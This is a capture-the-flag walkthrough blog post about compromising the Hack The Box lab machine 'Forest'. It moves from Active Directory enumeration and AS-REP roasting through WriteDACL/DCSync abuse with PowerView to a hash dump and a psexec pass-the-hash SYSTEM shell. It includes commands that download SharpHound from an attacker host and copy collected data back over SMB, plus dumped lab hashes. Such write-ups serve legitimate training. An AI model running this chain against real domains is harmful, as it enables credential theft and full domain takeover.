---
layout: post
title: "HTB-Forest"
categories: HTB-Walkthrough
---

![forest1](/assets/img/forest/forest1.png)


Forest is a new addition to TJNull's list of OSCP-like HTB machines. It is a big favourite of mine.

nmap first:


<h3>Nmap</h3>

```
nmap -sV -Pn -p- 10.10.10.161 |tee -a forest.txt
```

```

Nmap scan report for forest (10.10.10.161)
Host is up (0.26s latency).
Not shown: 65455 closed ports, 56 filtered ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-29 12:02:07Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49897/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/29%Time=5E808C1C%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

<hr width="300" size="10">




<h3>Enum4linux</h3>

This returns a huge wealth of information; Users, local groups, domain groups.



```
enum4linux 10.10.10.161
```


I put the usernames in users.txt
```
sebastien
lucinda
svc-alfresco
andy
mark
santi
```


<hr width="300" size="10">



<h3>AS-REP Roasting</h3>

I can use Impacket's python scripts to enumerate these users further, and retrieve password information.

```
cat enumusers.py 


#!/bin/bash
# use GetNPUsers.py to enumerate users

for user in $(cat users.txt);do
python GetNPUsers.py htb.local/$user -k -no-pass -request -format john -outputfile hashes.txt
done
```

The script works and recovers svc-alfresco's password hash.

```

Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$svc-alfresco@HTB.LOCAL:860b4df7cad71563d1a2f0f394817caf$7d6f8cc7604eb3e4d04c8e4741f58e10fb61ee8767d5f519c5a8a91a09d51e6906d444198fd4e317186c9e7e2bfc6fede72a222788713bb53ed48154ec8d915d9ff188c1452010933991b04f2745b995b84abdd7d197d403a511a84472f309fd38a5cde786bb097c09fd6691e47706944aa47634a2fc73509e08b1553f724230644a5bc37f6dd5a6bbabc7645a902ff66d27f82c3b7410688bc94247519c3d9fe166a136685d060cd7cd8fcb311de8b60598acdcf4d709ddd0a31c21add63263fe5ddbdf77602b2de8f1d39cd2ca4eb7fe08a110dbd26c2ba96b9eeb5c56ede9ce49188eadbd
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

```


We pass the hash to john.

```
$john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt


Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)
1g 0:00:00:04 DONE (2019-12-15 20:43) 0.2192g/s 896000p/s 896000c/s 896000C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

`svc-alfresco \ s3rvice`




<hr width="300" size="10">



<h3>Winrm</h3>


[Winrm](https://github.com/WinRb/WinRM) allows us to connect to the Windows Remote Management service.

first:
```
gem install winrm
```


Then we can use a simple ruby script to connect.



`cat winrm.rb`:
```
require 'winrm'
opts = { 
  endpoint: 'http://10.10.10.161:5985/wsman',
  user: 'svc-alfresco',
  password: 's3rvice'
}
conn = WinRM::Connection.new(opts)
conn.shell(:powershell) do |shell|
  output = shell.run('$PSVersionTable') do |stdout, stderr|
    STDOUT.print stdout
    STDERR.print stderr
  end
  puts "The script exited with exit code #{output.exitcode}"
end
```

run it with `ruby winrm.rb`

and wait for the connection...and powershell PS> prompt.

Check the connection is good with the `whoami` command.


```
$ruby winrm.rb 

PS > whoami
htb\svc-alfresco
PS > whoami /all

USER INFORMATION
----------------

User Name        SID                                          
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

<hr width="300" size="10">


The user flag is in this user's Desktop folder:
```
PS > cat user.txt
e5xxxxxxxxxxxxxxxxxxxxxxxxxxxxed
```





<hr width="300" size="10">



A great alternative to using a winrm.rb script is [evil-winrm](https://github.com/Hackplayers/evil-winrm)


Access target via evil-winrm
```
evil-winrm -i 10.10.10.161 -u sh1n0bi -p password123
```

There are benefits to using evil-winrm over winrm.rb, not least the 'upload' function.



<h3>Active Directory Recon with Bloodhound</h3>


[Bloodhound](https://github.com/BloodHoundAD/BloodHound) can be downloaded here.

[Follow this guide](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/) to set-up Bloodhound for processing recovered data.

<hr width="300" size="10">


I make my working directory to ensure I've got all the permissions I need, and to contain all my materials in one place,
making it easier to remove later.

```
mkdir c:\boo
```
changing to that directory I upload SharpHound.exe to it.

```
PS > iwr -uri http://10.10.14.24/SharpHound.exe -outfile c:\boo\sh.exe
```


Execute it with
```
sh.exe
```


![bloodhound](/assets/img/forest/forest-bloodhound.png)

Bloodhound creates a zip file that we need to get back to Kali.

Impacket's smbserver.py can help us here.

```
root@kali:~/HTB/active/forest# smbserver.py sh1n . -smb2support -username foo -password bar
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

On the target do:

```
net use \\10.10.14.24\sh1n /u:foo bar
```

Then send the file over:
```
copy 20200329120253_BloodHound.zip \\10.10.14.24\sh1n\
```

Now remove the share.
```
net use /d \\10.10.14.24\sh1n
```

We should probably also remove the zip, incase some other HTB users find it.

```
del *.zip
```

<hr width="300" size="10">


After examining the results, and adjusting svc-alfresco's group memberships I hit a stumbling block.


<hr width="300" size="10">





<h3>Add User</h3>

There seems to be some clean-up going on here, the user svc-alfresco seems to revert after a
short while, making playing with this account problematic.

We can use him however to create a new user, and assign that user to groups and award privileges,
then repeat the process. I also delete all files and the boo folder, and start again.


I create user 'sh1n0bi'

```
net user sh1n0bi password123 /add /domain
```

Try to award the new user with the same group membership and privileges as svc-alfresco.

examples:

```
PS > net localgroup "Remote Management Users" sh1n0bi /add
The command completed successfully.

PS > net localgroup "Pre-Windows 2000 Compatible Access" sh1n0bi /add
The command completed successfully.

PS > net group "Security Administrator" sh1n0bi /add /domain
The command completed successfully

```

This was the one that I really needed:

```
net group "Exchange Windows Permissions" sh1n0bi /add /domain
The command completed successfully.

```


<hr width="300" size="10">


```

PS > whoami /all

USER INFORMATION
----------------

User Name   SID                                          
=========== =============================================
htb\sh1n0bi S-1-5-21-3072663084-364016917-1341370565-7601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Exchange Windows Permissions           Group            S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```


<hr width="300" size="10">


I repeat the bloodhound procedure and look at my new graph, I click the query "Find Shortest Paths to Domain Admins".

![sh1n-path](/assets/img/forest/forest-bloodhound-sh1n-path.png)


Hovering the cursor over the `edge` (arrow) between `Exchange Windows Permissions@HTB.LOCAL` and
`HTB.LOCAL` it turns green and a label appears `WriteDACL` (couldn't get it in a screenshot).

![writedacl](/assets/img/forest/forest-writedacl.png)



Right-clicking that tab will give us instructions on executing the WriteDacls privilege escalation.


<hr width="300" size="10">


<h3>PowerView</h3>


I found an interesting site that explains [abusing active directory permissions with powerview](http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/)

Another covers [escalating privileges with acls in active directory ](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)




<hr width="300" size="10">



<h3>WriteDacls DCSync attack</h3>





Get a working PowerView
```
git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev
```

Access target via evil-winrm
```
evil-winrm -i 10.10.10.161 -u sh1n0bi -p password123
```

Upload PowerView.ps1 in evil-winrm

```
upload /root/HTB/active/forest/PowerView.ps1 .\PowerView.ps1
```


<hr width="300" size="10">



1. a command to Add sh1n0bi to the "Exchange Windows Permissions" group
```
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members sh1n0bi;$Username = 'htb\sh1n0bi';$Password = 'password123'
```

2. set the variable $pass for use in next command
```
$pass = ConvertTo-SecureString -AsPlainText $Password -Force
```

3. set the variable $Cred for use in final command
```
$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass
```

4. Uses the PowerView function Add-DomainObjectAcl to award sh1n0bi DCSync rights.
```
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'sh1n0bi' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

They can be executed individually,or as a one-liner. 
Ive already added sh1n0bi to the "Exchange Windows Permissions" group so don't need that first line.

```
$pass = ConvertTo-SecureString -AsPlainText $Password -Force;$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass;Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'sh1n0bi' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```



<hr width="300" size="10">



<h3>Secretsdump + Psexec</h3>


Now we can use Impacket's `secretsdump.py` to get the Admin hashes.


```
root@kali:~/HTB/active/forest# python secretsdump.py sh1n0bi:password123@10.10.10.161 -just-dc
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


<--Snip-->

htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::                        
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::                   
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::                           
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::                           
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::                          
sh1n0bi:7601:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::                                  
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:dd807da60f5c01bd698ae7413454a727:::                                  
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::                                  
[*] Kerberos keys grabbed                                                                                          
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b                    
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58                                                    
krbtgt:des-cbc-md5:9dd5647a31518ca8                                                                                
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4                                                                                                               
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e                            
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e                                                        
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf                                                                                                               
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd                            
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e                                                        
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e                                                                                                               
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed                            

<--Snip-->

```

Another Impacket tool `psexec.py` can give us an admin shell using the found hashes.
Grab the root flag.


```
python3 psexec.py Administrator@10.10.10.161 -target-ip 10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

```

```
root@kali:~/HTB/active/forest# python3 psexec.py Administrator@10.10.10.161 -target-ip 10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file tbsNuHBQ.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service gYZZ on 10.10.10.161.....
[*] Starting service gYZZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
f0xxxxxxxxxxxxxxxxxxxxxxxxxxxxcc
C:\Windows\system32>
```


<hr width="300" size="10">

:)


